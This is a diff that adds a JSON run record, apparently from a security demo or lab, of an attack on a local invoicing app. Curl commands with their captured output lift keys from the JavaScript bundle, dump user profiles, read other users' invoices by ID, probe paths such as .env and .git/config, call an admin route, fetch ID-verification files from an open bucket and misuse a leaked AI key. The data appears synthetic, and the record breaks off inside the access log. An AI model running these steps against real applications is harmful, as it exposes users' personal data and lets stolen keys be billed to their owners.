@@ -1,0 +1,957 @@
+{
+  "app": "http://localhost:4747",
+  "startedAt": "2026-11-03T01:11:30.641Z",
+  "finishedAt": "2026-11-03T01:11:30.973Z",
+  "steps": [
+    {
+      "id": "s1-html",
+      "title": "Step 1. Find the JavaScript bundle the page loads",
+      "command": "curl -s \"$APP/\" | grep -o '/assets/index-[A-Za-z0-9_-]*\\.js'",
+      "body": "/assets/index-BDoMPjHA.js\n",
+      "raw": "/assets/index-BDoMPjHA.js\n"
+    },
+    {
+      "id": "s1-keys",
+      "title": "Step 1. Search the bundle for keys",
+      "command": "curl -s \"$APP$BUNDLE\" | grep -oE 'eyJ[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+|demo_ai_key[A-Za-z0-9_]*' | sort -u",
+      "body": "demo_ai_key_tallybird_0001\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ0YWxseWJpcmQtZGVtbyIsInJlZiI6InRhbGx5YmlyZC1sb2NhbCIsInJvbGUiOiJhbm9uIiwiaWF0IjoxNzY3MjI1NjAwLCJleHAiOjIwODI3NTg0MDB9.xuN5YG84-n8uCI9QYGTgxj6MXhOri91ZqA5qh9E50oI\n",
+      "raw": "demo_ai_key_tallybird_0001\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ0YWxseWJpcmQtZGVtbyIsInJlZiI6InRhbGx5YmlyZC1sb2NhbCIsInJvbGUiOiJhbm9uIiwiaWF0IjoxNzY3MjI1NjAwLCJleHAiOjIwODI3NTg0MDB9.xuN5YG84-n8uCI9QYGTgxj6MXhOri91ZqA5qh9E50oI\n"
+    },
+    {
+      "id": "s1-context",
+      "title": "Step 1. Where the keys sit in the bundle",
+      "command": null,
+      "bundle": {
+        "path": "/assets/index-BDoMPjHA.js",
+        "bytes": 156555,
+        "anon": {
+          "before": "Root=v.hydrateRoot,Tl}var Jf=Xf();const Rl=window.location.origin,Va=\"",
+          "match": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9",
+          "after": ".eyJpc3MiO"
+        },
+        "ai": {
+          "before": "on().catch(()=>({}));return{ok:L.ok,status:L.status,data:_}}const qf=\"",
+          "match": "demo_ai_key_tallybird_0001",
+          "after": "\",bf=`${window.location.origin}/mock-ai/v1`;async function ed(v){var L"
+        }
+      },
+      "json": {
+        "iss": "tallybird-demo",
+        "ref": "tallybird-local",
+        "role": "anon",
+        "iat": 1767225600,
+        "exp": 2082758400
+      }
+    },
+    {
+      "id": "s2-dump",
+      "title": "Step 2. Ask the database for every profile, with only the public key",
+      "command": "curl -s -i \"$APP/rest/v1/profiles?select=*\" -H \"apikey: $KEY\" -H \"Authorization: Bearer $KEY\" -H \"Prefer: count=exact\"",
+      "status": 206,
+      "statusLine": "HTTP/1.1 206 Partial Content",
+      "headers": {
+        "access-control-allow-origin": "*",
+        "content-type": "application/json; charset=utf-8",
+        "content-range": "0-999/1284",
+        "date": "Tue, 03 Nov 2026 01:11:30 GMT",
+        "connection": "keep-alive",
+        "keep-alive": "timeout=5",
+        "transfer-encoding": "chunked"
+      },
+      "json": {
+        "rows": 1000,
+        "first": [
+          {
+            "id": "feb85d89-d345-4bd2-a540-ce7132bfa964",
+            "full_name": "Hannah Petrov",
+            "email": "hannah.petrov@example.net",
+            "company": "Juniper Studio",
+            "city": "Stuttgart",
+            "plan": "free",
+            "is_admin": false,
+            "id_verified": false,
+            "created_at": "2025-05-29T22:47:56.000Z"
+          },
+          {
+            "id": "81d2b03f-5cb6-45e2-832c-570236be618f",
+            "full_name": "Jonas Jung",
+            "email": "jonas.jung@example.net",
+            "company": "Hollow Atelier",
+            "city": "Berlin",
+            "plan": "pro",
+            "is_admin": false,
+            "id_verified": false,
+            "created_at": "2025-05-30T00:58:31.000Z"
+          },
+          {
+            "id": "b8cf5d66-f465-4da6-b8fa-5ab5e9159361",
+            "full_name": "Mateo Rossi",
+            "email": "mateo.rossi34@example.net",
+            "company": "Quarry Labs",
+            "city": "Barcelona",
+            "plan": "free",
+            "is_admin": false,
+            "id_verified": false,
+            "created_at": "2025-05-30T04:39:30.000Z"
+          }
+        ],
+        "sample_emails": [
+          "lina.ozturk53@example.org",
+          "jan.roth35@example.com",
+          "lina.roth46@example.com",
+          "chloe.brandt@example.net",
+          "yara.roth@example.com",
+          "aisha.ricci@example.com"
+        ]
+      }
+    },
+    {
+      "id": "s3-signup",
+      "title": "Step 3. Sign up like anyone would",
+      "command": "curl -s \"$APP/auth/v1/signup\" -H \"apikey: $KEY\" -H \"Content-Type: application/json\" -d '{\"email\":\"attacker@example.com\",\"password\":\"correct-horse-battery\"}'",
+      "body": "{\"access_token\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ0YWxseWJpcmQtZGVtby9hdXRoL3YxIiwic3ViIjoiYzIyMjhjZDQtMmZmMy00NzZmLTlmN2UtY2RiYzI3MWY5N2Q1IiwiYXVkIjoiYXV0aGVudGljYXRlZCIsInJvbGUiOiJhdXRoZW50aWNhdGVkIiwiZW1haWwiOiJhdHRhY2tlckBleGFtcGxlLmNvbSIsImlhdCI6MTc5MzY2ODI5MCwiZXhwIjoxNzkzNjcxODkwfQ.Q6GlubHJk0pLmglo9dqlZrmkpZKo_MYV5YcfwXa2oBQ\",\"token_type\":\"bearer\",\"expires_in\":3600,\"expires_at\":1793671890,\"refresh_token\":\"74202c6864dfdf2c9bd141fd\",\"user\":{\"id\":\"c2228cd4-2ff3-476f-9f7e-cdbc271f97d5\",\"aud\":\"authenticated\",\"role\":\"authenticated\",\"email\":\"attacker@example.com\",\"email_confirmed_at\":\"2026-11-03T01:11:30.713Z\",\"phone\":\"\",\"confirmed_at\":\"2026-11-03T01:11:30.713Z\",\"last_sign_in_at\":\"2026-11-03T01:11:30.713Z\",\"app_metadata\":{\"provider\":\"email\",\"providers\":[\"email\"]},\"user_metadata\":{\"full_name\":\"attacker\"},\"identities\":[],\"created_at\":\"2026-11-03T01:11:30.713Z\",\"updated_at\":\"2026-11-03T01:11:30.713Z\",\"is_anonymous\":false}}",
+      "raw": "{\"access_token\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ0YWxseWJpcmQtZGVtby9hdXRoL3YxIiwic3ViIjoiYzIyMjhjZDQtMmZmMy00NzZmLTlmN2UtY2RiYzI3MWY5N2Q1IiwiYXVkIjoiYXV0aGVudGljYXRlZCIsInJvbGUiOiJhdXRoZW50aWNhdGVkIiwiZW1haWwiOiJhdHRhY2tlckBleGFtcGxlLmNvbSIsImlhdCI6MTc5MzY2ODI5MCwiZXhwIjoxNzkzNjcxODkwfQ.Q6GlubHJk0pLmglo9dqlZrmkpZKo_MYV5YcfwXa2oBQ\",\"token_type\":\"bearer\",\"expires_in\":3600,\"expires_at\":1793671890,\"refresh_token\":\"74202c6864dfdf2c9bd141fd\",\"user\":{\"id\":\"c2228cd4-2ff3-476f-9f7e-cdbc271f97d5\",\"aud\":\"authenticated\",\"role\":\"authenticated\",\"email\":\"attacker@example.com\",\"email_confirmed_at\":\"2026-11-03T01:11:30.713Z\",\"phone\":\"\",\"confirmed_at\":\"2026-11-03T01:11:30.713Z\",\"last_sign_in_at\":\"2026-11-03T01:11:30.713Z\",\"app_metadata\":{\"provider\":\"email\",\"providers\":[\"email\"]},\"user_metadata\":{\"full_name\":\"attacker\"},\"identities\":[],\"created_at\":\"2026-11-03T01:11:30.713Z\",\"updated_at\":\"2026-11-03T01:11:30.713Z\",\"is_anonymous\":false}}",
+      "json": {
+        "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ0YWxseWJpcmQtZGVtby9hdXRoL3YxIiwic3ViIjoiYzIyMjhjZDQtMmZmMy00NzZmLTlmN2UtY2RiYzI3MWY5N2Q1IiwiYXVkIjoiYXV0aGVudGljYXRlZCIsInJvbGUiOiJhdXRoZW50aWNhdGVkIiwiZW1haWwiOiJhdHRhY2tlckBleGFtcGxlLmNvbSIsImlhdCI6MTc5MzY2ODI5MCwiZXhwIjoxNzkzNjcxODkwfQ.Q6GlubHJk0pLmglo9dqlZrmkpZKo_MYV5YcfwXa2oBQ",
+        "token_type": "bearer",
+        "expires_in": 3600,
+        "expires_at": 1793671890,
+        "refresh_token": "74202c6864dfdf2c9bd141fd",
+        "user": {
+          "id": "c2228cd4-2ff3-476f-9f7e-cdbc271f97d5",
+          "aud": "authenticated",
+          "role": "authenticated",
+          "email": "attacker@example.com",
+          "email_confirmed_at": "2026-11-03T01:11:30.713Z",
+          "phone": "",
+          "confirmed_at": "2026-11-03T01:11:30.713Z",
+          "last_sign_in_at": "2026-11-03T01:11:30.713Z",
+          "app_metadata": {
+            "provider": "email",
+            "providers": [
+              "email"
+            ]
+          },
+          "user_metadata": {
+            "full_name": "attacker"
+          },
+          "identities": [],
+          "created_at": "2026-11-03T01:11:30.713Z",
+          "updated_at": "2026-11-03T01:11:30.713Z",
+          "is_anonymous": false
+        }
+      }
+    },
+    {
+      "id": "s3-mine",
+      "title": "Step 3. My invoices",
+      "command": "curl -s \"$APP/api/invoices\" -H \"Authorization: Bearer $TOKEN\"",
+      "body": "[{\"id\":4212,\"owner_id\":\"c2228cd4-2ff3-476f-9f7e-cdbc271f97d5\",\"client_name\":\"Your first client\",\"client_email\":\"billing@client.example\",\"description\":\"Sample invoice: edit me\",\"amount_eur\":500,\"status\":\"draft\",\"due_date\":\"2026-11-15\",\"created_at\":\"2026-11-03T01:11:30.713Z\"}]",
+      "raw": "[{\"id\":4212,\"owner_id\":\"c2228cd4-2ff3-476f-9f7e-cdbc271f97d5\",\"client_name\":\"Your first client\",\"client_email\":\"billing@client.example\",\"description\":\"Sample invoice: edit me\",\"amount_eur\":500,\"status\":\"draft\",\"due_date\":\"2026-11-15\",\"created_at\":\"2026-11-03T01:11:30.713Z\"}]",
+      "json": [
+        {
+          "id": 4212,
+          "owner_id": "c2228cd4-2ff3-476f-9f7e-cdbc271f97d5",
+          "client_name": "Your first client",
+          "client_email": "billing@client.example",
+          "description": "Sample invoice: edit me",
+          "amount_eur": 500,
+          "status": "draft",
+          "due_date": "2026-11-15",
+          "created_at": "2026-11-03T01:11:30.713Z"
+        }
+      ]
+    },
+    {
+      "id": "s3-other",
+      "title": "Step 3. Change the number by one",
+      "command": "curl -s \"$APP/api/invoices/$OTHER\" -H \"Authorization: Bearer $TOKEN\"",
+      "body": "{\"id\":4211,\"owner_id\":\"6c815e0a-714c-4bab-9ec7-84a5baf79618\",\"client_name\":\"Harbor Wines\",\"client_email\":\"billing@harbor-wines.example\",\"description\":\"Brand workshop (2 days)\",\"amount_eur\":7330,\"status\":\"paid\",\"due_date\":\"2026-11-16\",\"created_at\":\"2026-10-31T09:00:00.000Z\",\"owner\":{\"full_name\":\"Nina Dubois\",\"email\":\"nina.dubois47@example.org\"}}",
+      "raw": "{\"id\":4211,\"owner_id\":\"6c815e0a-714c-4bab-9ec7-84a5baf79618\",\"client_name\":\"Harbor Wines\",\"client_email\":\"billing@harbor-wines.example\",\"description\":\"Brand workshop (2 days)\",\"amount_eur\":7330,\"status\":\"paid\",\"due_date\":\"2026-11-16\",\"created_at\":\"2026-10-31T09:00:00.000Z\",\"owner\":{\"full_name\":\"Nina Dubois\",\"email\":\"nina.dubois47@example.org\"}}",
+      "json": {
+        "id": 4211,
+        "owner_id": "6c815e0a-714c-4bab-9ec7-84a5baf79618",
+        "client_name": "Harbor Wines",
+        "client_email": "billing@harbor-wines.example",
+        "description": "Brand workshop (2 days)",
+        "amount_eur": 7330,
+        "status": "paid",
+        "due_date": "2026-11-16",
+        "created_at": "2026-10-31T09:00:00.000Z",
+        "owner": {
+          "full_name": "Nina Dubois",
+          "email": "nina.dubois47@example.org"
+        }
+      }
+    },
+    {
+      "id": "s3-loop",
+      "title": "Step 3. Walk back twenty invoices",
+      "command": "for i in $(seq $FROM $OTHER); do curl -s -o /dev/null -w \"%{http_code} \" \"$APP/api/invoices/$i\" -H \"Authorization: Bearer $TOKEN\"; done; echo",
+      "body": "200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 \n",
+      "raw": "200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 \n"
+    },
+    {
+      "id": "s4-sweep",
+      "title": "Step 4. Knock on the usual doors",
+      "command": "for p in .env .git/config backup.zip wp-login.php swagger.json admin api/admin api/docs; do curl -s -o /dev/null -w \"%{http_code}  /$p\\n\" \"$APP/$p\"; done",
+      "body": "404  /.env\n404  /.git/config\n404  /backup.zip\n404  /wp-login.php\n404  /swagger.json\n200  /admin\n401  /api/admin\n200  /api/docs\n",
+      "raw": "404  /.env\n404  /.git/config\n404  /backup.zip\n404  /wp-login.php\n404  /swagger.json\n200  /admin\n401  /api/admin\n200  /api/docs\n"
+    },
+    {
+      "id": "s4-spec",
+      "title": "Step 4. Read the API docs the app publishes",
+      "command": "curl -s \"$APP/api/openapi.json\"",
+      "body": "{\"openapi\":\"3.0.3\",\"info\":{\"title\":\"Tallybird API\",\"version\":\"0.4.2\",\"description\":\"Backend routes for the Tallybird web app.\"},\"servers\":[{\"url\":\"/\"}],\"components\":{\"securitySchemes\":{\"bearer\":{\"type\":\"http\",\"scheme\":\"bearer\"}}},\"security\":[{\"bearer\":[]}],\"paths\":{\"/api/invoices\":{\"get\":{\"summary\":\"List my invoices\"},\"post\":{\"summary\":\"Create an invoice\"}},\"/api/invoices/{id}\":{\"get\":{\"summary\":\"Get one invoice\",\"parameters\":[{\"name\":\"id\",\"in\":\"path\",\"required\":true,\"schema\":{\"type\":\"integer\"}}]}},\"/api/ai/draft-reminder\":{\"post\":{\"summary\":\"Draft a payment reminder email with AI\"}},\"/api/admin/users\":{\"get\":{\"summary\":\"List all users (admin dashboard)\",\"x-internal\":true,\"parameters\":[{\"name\":\"limit\",\"in\":\"query\",\"schema\":{\"type\":\"integer\",\"default\":50}},{\"name\":\"offset\",\"in\":\"query\",\"schema\":{\"type\":\"integer\",\"default\":0}}]}},\"/api/admin/stats\":{\"get\":{\"summary\":\"Revenue and usage numbers (admin dashboard)\",\"x-internal\":true}}}}",
+      "raw": "{\"openapi\":\"3.0.3\",\"info\":{\"title\":\"Tallybird API\",\"version\":\"0.4.2\",\"description\":\"Backend routes for the Tallybird web app.\"},\"servers\":[{\"url\":\"/\"}],\"components\":{\"securitySchemes\":{\"bearer\":{\"type\":\"http\",\"scheme\":\"bearer\"}}},\"security\":[{\"bearer\":[]}],\"paths\":{\"/api/invoices\":{\"get\":{\"summary\":\"List my invoices\"},\"post\":{\"summary\":\"Create an invoice\"}},\"/api/invoices/{id}\":{\"get\":{\"summary\":\"Get one invoice\",\"parameters\":[{\"name\":\"id\",\"in\":\"path\",\"required\":true,\"schema\":{\"type\":\"integer\"}}]}},\"/api/ai/draft-reminder\":{\"post\":{\"summary\":\"Draft a payment reminder email with AI\"}},\"/api/admin/users\":{\"get\":{\"summary\":\"List all users (admin dashboard)\",\"x-internal\":true,\"parameters\":[{\"name\":\"limit\",\"in\":\"query\",\"schema\":{\"type\":\"integer\",\"default\":50}},{\"name\":\"offset\",\"in\":\"query\",\"schema\":{\"type\":\"integer\",\"default\":0}}]}},\"/api/admin/stats\":{\"get\":{\"summary\":\"Revenue and usage numbers (admin dashboard)\",\"x-internal\":true}}}}",
+      "json": {
+        "openapi": "3.0.3",
+        "info": {
+          "title": "Tallybird API",
+          "version": "0.4.2",
+          "description": "Backend routes for the Tallybird web app."
+        },
+        "servers": [
+          {
+            "url": "/"
+          }
+        ],
+        "components": {
+          "securitySchemes": {
+            "bearer": {
+              "type": "http",
+              "scheme": "bearer"
+            }
+          }
+        },
+        "security": [
+          {
+            "bearer": []
+          }
+        ],
+        "paths": {
+          "/api/invoices": {
+            "get": {
+              "summary": "List my invoices"
+            },
+            "post": {
+              "summary": "Create an invoice"
+            }
+          },
+          "/api/invoices/{id}": {
+            "get": {
+              "summary": "Get one invoice",
+              "parameters": [
+                {
+                  "name": "id",
+                  "in": "path",
+                  "required": true,
+                  "schema": {
+                    "type": "integer"
+                  }
+                }
+              ]
+            }
+          },
+          "/api/ai/draft-reminder": {
+            "post": {
+              "summary": "Draft a payment reminder email with AI"
+            }
+          },
+          "/api/admin/users": {
+            "get": {
+              "summary": "List all users (admin dashboard)",
+              "x-internal": true,
+              "parameters": [
+                {
+                  "name": "limit",
+                  "in": "query",
+                  "schema": {
+                    "type": "integer",
+                    "default": 50
+                  }
+                },
+                {
+                  "name": "offset",
+                  "in": "query",
+                  "schema": {
+                    "type": "integer",
+                    "default": 0
+                  }
+                }
+              ]
+            }
+          },
+          "/api/admin/stats": {
+            "get": {
+              "summary": "Revenue and usage numbers (admin dashboard)",
+              "x-internal": true
+            }
+          }
+        }
+      }
+    },
+    {
+      "id": "s4-admin",
+      "title": "Step 4. Call the admin route with a free account",
+      "command": "curl -s \"$APP/api/admin/users?limit=3\" -H \"Authorization: Bearer $TOKEN\"",
+      "body": "{\"total\":1285,\"users\":[{\"id\":\"c2228cd4-2ff3-476f-9f7e-cdbc271f97d5\",\"full_name\":\"attacker\",\"email\":\"attacker@example.com\",\"plan\":\"free\",\"is_admin\":false,\"id_verified\":false,\"created_at\":\"2026-11-03T01:11:30.713Z\",\"last_login_ip\":\"198.51.100.78\"},{\"id\":\"f2194b62-ed33-4ead-b322-2a9e68367615\",\"full_name\":\"Zoe Keller\",\"email\":\"zoe.keller@example.org\",\"plan\":\"free\",\"is_admin\":false,\"id_verified\":false,\"created_at\":\"2026-10-30T08:46:39.000Z\",\"last_login_ip\":\"203.0.113.87\"},{\"id\":\"4c286124-e26f-4c23-8e6d-5b4e1409c6db\",\"full_name\":\"Lina Sommer\",\"email\":\"lina.sommer@example.net\",\"plan\":\"free\",\"is_admin\":false,\"id_verified\":true,\"created_at\":\"2026-10-29T16:42:05.000Z\",\"last_login_ip\":\"198.51.100.136\"}]}",
+      "raw": "{\"total\":1285,\"users\":[{\"id\":\"c2228cd4-2ff3-476f-9f7e-cdbc271f97d5\",\"full_name\":\"attacker\",\"email\":\"attacker@example.com\",\"plan\":\"free\",\"is_admin\":false,\"id_verified\":false,\"created_at\":\"2026-11-03T01:11:30.713Z\",\"last_login_ip\":\"198.51.100.78\"},{\"id\":\"f2194b62-ed33-4ead-b322-2a9e68367615\",\"full_name\":\"Zoe Keller\",\"email\":\"zoe.keller@example.org\",\"plan\":\"free\",\"is_admin\":false,\"id_verified\":false,\"created_at\":\"2026-10-30T08:46:39.000Z\",\"last_login_ip\":\"203.0.113.87\"},{\"id\":\"4c286124-e26f-4c23-8e6d-5b4e1409c6db\",\"full_name\":\"Lina Sommer\",\"email\":\"lina.sommer@example.net\",\"plan\":\"free\",\"is_admin\":false,\"id_verified\":true,\"created_at\":\"2026-10-29T16:42:05.000Z\",\"last_login_ip\":\"198.51.100.136\"}]}",
+      "json": {
+        "total": 1285,
+        "users": [
+          {
+            "id": "c2228cd4-2ff3-476f-9f7e-cdbc271f97d5",
+            "full_name": "attacker",
+            "email": "attacker@example.com",
+            "plan": "free",
+            "is_admin": false,
+            "id_verified": false,
+            "created_at": "2026-11-03T01:11:30.713Z",
+            "last_login_ip": "198.51.100.78"
+          },
+          {
+            "id": "f2194b62-ed33-4ead-b322-2a9e68367615",
+            "full_name": "Zoe Keller",
+            "email": "zoe.keller@example.org",
+            "plan": "free",
+            "is_admin": false,
+            "id_verified": false,
+            "created_at": "2026-10-30T08:46:39.000Z",
+            "last_login_ip": "203.0.113.87"
+          },
+          {
+            "id": "4c286124-e26f-4c23-8e6d-5b4e1409c6db",
+            "full_name": "Lina Sommer",
+            "email": "lina.sommer@example.net",
+            "plan": "free",
+            "is_admin": false,
+            "id_verified": true,
+            "created_at": "2026-10-29T16:42:05.000Z",
+            "last_login_ip": "198.51.100.136"
+          }
+        ]
+      }
+    },
+    {
+      "id": "s5-list",
+      "title": "Step 5. List the ID bucket, with only the public key",
+      "command": "curl -s \"$APP/storage/v1/object/list/id-verification\" -H \"apikey: $KEY\" -H \"Content-Type: application/json\" -d '{\"prefix\":\"\",\"limit\":1000}'",
+      "json": {
+        "folders": 356,
+        "first": [
+          {
+            "name": "ec011f15-fd5f-4524-b1c8-0144dca72a38",
+            "id": null,
+            "updated_at": null,
+            "created_at": null,
+            "last_accessed_at": null,
+            "metadata": null
+          },
+          {
+            "name": "6b017556-a32e-43e8-95ab-69ba504fefe0",
+            "id": null,
+            "updated_at": null,
+            "created_at": null,
+            "last_accessed_at": null,
+            "metadata": null
+          },
+          {
+            "name": "4244870a-35ee-44dd-bd8d-3851af54ec23",
+            "id": null,
+            "updated_at": null,
+            "created_at": null,
+            "last_accessed_at": null,
+            "metadata": null
+          }
+        ]
+      }
+    },
+    {
+      "id": "s5-folder",
+      "title": "Step 5. Look inside one folder",
+      "command": "curl -s \"$APP/storage/v1/object/list/id-verification\" -H \"apikey: $KEY\" -H \"Content-Type: application/json\" -d \"{\\\"prefix\\\":\\\"$FOLDER\\\"}\"",
+      "body": "[{\"name\":\"id-front.svg\",\"id\":\"9b75be79-381e-4f04-a017-0e6784584dc4\",\"updated_at\":\"2025-06-03T17:09:25.000Z\",\"created_at\":\"2025-06-03T17:09:25.000Z\",\"last_accessed_at\":\"2025-06-03T17:09:25.000Z\",\"metadata\":{\"eTag\":\"\\\"9b75be79381eff0470170e6784584dc4\\\"\",\"size\":1763,\"mimetype\":\"image/svg+xml\",\"cacheControl\":\"max-age=3600\",\"lastModified\":\"2025-06-03T17:09:25.000Z\",\"contentLength\":1763,\"httpStatusCode\":200}}]",
+      "raw": "[{\"name\":\"id-front.svg\",\"id\":\"9b75be79-381e-4f04-a017-0e6784584dc4\",\"updated_at\":\"2025-06-03T17:09:25.000Z\",\"created_at\":\"2025-06-03T17:09:25.000Z\",\"last_accessed_at\":\"2025-06-03T17:09:25.000Z\",\"metadata\":{\"eTag\":\"\\\"9b75be79381eff0470170e6784584dc4\\\"\",\"size\":1763,\"mimetype\":\"image/svg+xml\",\"cacheControl\":\"max-age=3600\",\"lastModified\":\"2025-06-03T17:09:25.000Z\",\"contentLength\":1763,\"httpStatusCode\":200}}]",
+      "json": [
+        {
+          "name": "id-front.svg",
+          "id": "9b75be79-381e-4f04-a017-0e6784584dc4",
+          "updated_at": "2025-06-03T17:09:25.000Z",
+          "created_at": "2025-06-03T17:09:25.000Z",
+          "last_accessed_at": "2025-06-03T17:09:25.000Z",
+          "metadata": {
+            "eTag": "\"9b75be79381eff0470170e6784584dc4\"",
+            "size": 1763,
+            "mimetype": "image/svg+xml",
+            "cacheControl": "max-age=3600",
+            "lastModified": "2025-06-03T17:09:25.000Z",
+            "contentLength": 1763,
+            "httpStatusCode": 200
+          }
+        }
+      ]
+    },
+    {
+      "id": "s5-file",
+      "title": "Step 5. Open the file, no key at all",
+      "command": "curl -s -o id-front.svg -w \"%{http_code} %{content_type} %{size_download} bytes\\n\" \"$APP/storage/v1/object/public/id-verification/$FOLDER/id-front.svg\"",
+      "body": "200 image/svg+xml 1763 bytes\n",
+      "raw": "200 image/svg+xml 1763 bytes\n",
+      "svg": "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"640\" height=\"400\" viewBox=\"0 0 640 400\" role=\"img\" aria-label=\"Specimen ID card for Ben Schneider\">\n<rect width=\"640\" height=\"400\" rx=\"18\" fill=\"#e8eef5\"/>\n<rect x=\"0\" y=\"0\" width=\"640\" height=\"64\" rx=\"18\" fill=\"#3b5b86\"/>\n<rect x=\"0\" y=\"40\" width=\"640\" height=\"24\" fill=\"#3b5b86\"/>\n<text x=\"28\" y=\"42\" font-family=\"Arial, sans-serif\" font-size=\"22\" font-weight=\"700\" fill=\"#ffffff\">IDENTITY CARD · SPECIMEN</text>\n<text x=\"612\" y=\"42\" text-anchor=\"end\" font-family=\"Arial, sans-serif\" font-size=\"16\" fill=\"#dbe6f3\">NOT A REAL DOCUMENT</text>\n<rect x=\"28\" y=\"92\" width=\"168\" height=\"208\" rx=\"10\" fill=\"#c9d6e6\"/>\n<circle cx=\"112\" cy=\"168\" r=\"44\" fill=\"#9fb3cc\"/>\n<rect x=\"56\" y=\"222\" width=\"112\" height=\"60\" rx=\"30\" fill=\"#9fb3cc\"/>\n<text x=\"112\" y=\"182\" text-anchor=\"middle\" font-family=\"Arial, sans-serif\" font-size=\"34\" font-weight=\"700\" fill=\"#3b5b86\">BS</text>\n<text x=\"224\" y=\"118\" font-family=\"Arial, sans-serif\" font-size=\"13\" fill=\"#5b6b80\">SURNAME / GIVEN NAMES</text>\n<text x=\"224\" y=\"146\" font-family=\"Arial, sans-serif\" font-size=\"26\" font-weight=\"700\" fill=\"#1d2b3e\">Ben Schneider</text>\n<text x=\"224\" y=\"186\" font-family=\"Arial, sans-serif\" font-size=\"13\" fill=\"#5b6b80\">DATE OF BIRTH</text>\n<text x=\"224\" y=\"210\" font-family=\"Arial, sans-serif\" font-size=\"20\" fill=\"#1d2b3e\">1968-08-19</text>\n<text x=\"224\" y=\"248\" font-family=\"Arial, sans-serif\" font-size=\"13\" fill=\"#5b6b80\">DOCUMENT NO.</text>\n<text x=\"224\" y=\"272\" font-family=\"Arial, sans-serif\" font-size=\"20\" fill=\"#1d2b3e\">SPECIMEN-EC01</text>\n<text x=\"320\" y=\"360\" text-anchor=\"middle\" font-family=\"Arial, sans-serif\" font-size=\"56\" font-weight=\"700\" fill=\"#3b5b86\" fill-opacity=\"0.16\" transform=\"rotate(-12 320 360)\">SPECIMEN</text>\n</svg>"
+    },
+    {
+      "id": "s6-ai",
+      "title": "Bonus. Use the AI key from step 1 for something else",
+      "command": "curl -s -i \"$APP/mock-ai/v1/chat/completions\" -H \"Authorization: Bearer $AIKEY\" -H \"Content-Type: application/json\" -d '{\"model\":\"demo-model\",\"messages\":[{\"role\":\"user\",\"content\":\"Write a poem about invoices\"}]}'",
+      "status": 200,
+      "statusLine": "HTTP/1.1 200 OK",
+      "headers": {
+        "access-control-allow-origin": "*",
+        "content-type": "application/json; charset=utf-8",
+        "x-demo-billed-to": "tallybird",
+        "x-demo-spend-today-usd": "0.0006",
+        "date": "Tue, 03 Nov 2026 01:11:30 GMT",
+        "connection": "keep-alive",
+        "keep-alive": "timeout=5",
+        "transfer-encoding": "chunked"
+      },
+      "body": "{\"id\":\"chatcmpl-demo-dfb6fa3776b0\",\"object\":\"chat.completion\",\"created\":1793668290,\"model\":\"demo-model\",\"choices\":[{\"index\":0,\"message\":{\"role\":\"assistant\",\"content\":\"An invoice waits in someone else's tray,\\nits numbers patient, polite, overdue.\\nThe key that paid for this was given away,\\nand every line I write is billed to you.\"},\"finish_reason\":\"stop\"}],\"usage\":{\"prompt_tokens\":19,\"completion_tokens\":41,\"total_tokens\":60}}",
+      "raw": "HTTP/1.1 200 OK\r\naccess-control-allow-origin: *\r\ncontent-type: application/json; charset=utf-8\r\nx-demo-billed-to: tallybird\r\nx-demo-spend-today-usd: 0.0006\r\nDate: Tue, 03 Nov 2026 01:11:30 GMT\r\nConnection: keep-alive\r\nKeep-Alive: timeout=5\r\nTransfer-Encoding: chunked\r\n\r\n{\"id\":\"chatcmpl-demo-dfb6fa3776b0\",\"object\":\"chat.completion\",\"created\":1793668290,\"model\":\"demo-model\",\"choices\":[{\"index\":0,\"message\":{\"role\":\"assistant\",\"content\":\"An invoice waits in someone else's tray,\\nits numbers patient, polite, overdue.\\nThe key that paid for this was given away,\\nand every line I write is billed to you.\"},\"finish_reason\":\"stop\"}],\"usage\":{\"prompt_tokens\":19,\"completion_tokens\":41,\"total_tokens\":60}}",
+      "json": {
+        "id": "chatcmpl-demo-dfb6fa3776b0",
+        "object": "chat.completion",
+        "created": 1793668290,
+        "model": "demo-model",
+        "choices": [
+          {
+            "index": 0,
+            "message": {
+              "role": "assistant",
+              "content": "An invoice waits in someone else's tray,\nits numbers patient, polite, overdue.\nThe key that paid for this was given away,\nand every line I write is billed to you."
+            },
+            "finish_reason": "stop"
+          }
+        ],
+        "usage": {
+          "prompt_tokens": 19,
+          "completion_tokens": 41,
+          "total_tokens": 60
+        }
+      }
+    },
+    {
+      "id": "s6-loop",
+      "title": "Bonus. Five more calls, billed to Tallybird",
+      "command": "for i in 1 2 3 4 5; do curl -s -o /dev/null -w \"%{http_code} \" \"$APP/mock-ai/v1/chat/completions\" -H \"Authorization: Bearer $AIKEY\" -H \"Content-Type: application/json\" -d '{\"messages\":[{\"role\":\"user\",\"content\":\"Write a poem about invoices\"}]}'; done; echo",
+      "body": "200 200 200 200 200 \n",
+      "raw": "200 200 200 200 200 \n"
+    }
+  ],
+  "accessLog": [
+    {
+      "time": "2026-11-03T01:11:30.655Z",
+      "ip": "127.0.0.1",
+      "method": "GET",
+      "path": "/",
+      "status": 200,
+      "ms": 1,
+      "user": "anon",
+      "ua": "curl/8.7.1"
+    },
+    {
+      "time": "2026-11-03T01:11:30.664Z",
+      "ip": "127.0.0.1",
+      "method": "GET",
+      "path": "/assets/index-BDoMPjHA.js",
+      "status": 200,
+      "ms": 0,
+      "user": "anon",
+      "ua": "curl/8.7.1"
+    },
+    {
+      "time": "2026-11-03T01:11:30.674Z",
+      "ip": "127.0.0.1",
+      "method": "GET",
+      "path": "/assets/index-BDoMPjHA.js",
+      "status": 200,
+      "ms": 0,
+      "user": "anon",
+      "ua": "curl/8.7.1"
+    },
+    {
+      "time": "2026-11-03T01:11:30.684Z",
+      "ip": "127.0.0.1",
+      "method": "GET",
+      "path": "/rest/v1/profiles?select=*",
+      "status": 206,
+      "ms": 1,
+      "user": "anon",
+      "ua": "curl/8.7.1"
+    },
+    {
+      "time": "2026-11-03T01:11:30.713Z",
